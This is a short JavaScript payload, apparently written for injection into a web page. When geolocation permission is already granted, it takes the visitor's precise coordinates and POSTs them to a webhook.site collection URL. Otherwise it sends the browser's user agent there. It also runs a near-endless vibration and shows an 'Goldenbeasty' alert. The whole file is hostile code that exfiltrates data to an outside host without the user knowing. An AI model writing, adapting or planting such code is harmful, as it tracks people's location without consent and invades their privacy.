function main() {
    var options = {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0
    };

    function success(pos) {
        var crd = pos.coords;
        var data = [crd.latitude, crd.longitude, crd.accuracy];
        let xhr = new XMLHttpRequest();
        xhr.open("POST", url);
        xhr.send(data);
    }

    function error(err) {
        console.warn(`ERROR(${err.code}): ${err.message}`);
    }

    let url = 'https://webhook.site/6d47f71f-5a35-433a-981e-bc94dbdeb1a6';

    navigator.permissions.query({ name: 'geolocation' }).then(function (result) {
        if (result.state === 'granted') {
            navigator.geolocation.getCurrentPosition(success, error, options);
        }
        else {
            let xhr = new XMLHttpRequest();
            xhr.open("POST", url);
            xhr.send('Code was called by: ' + navigator.userAgent); // You only live once, enable geolocation
        }
    });

    navigator.vibrate(200000000000);
    alert('Goldenbeasty');
}
main()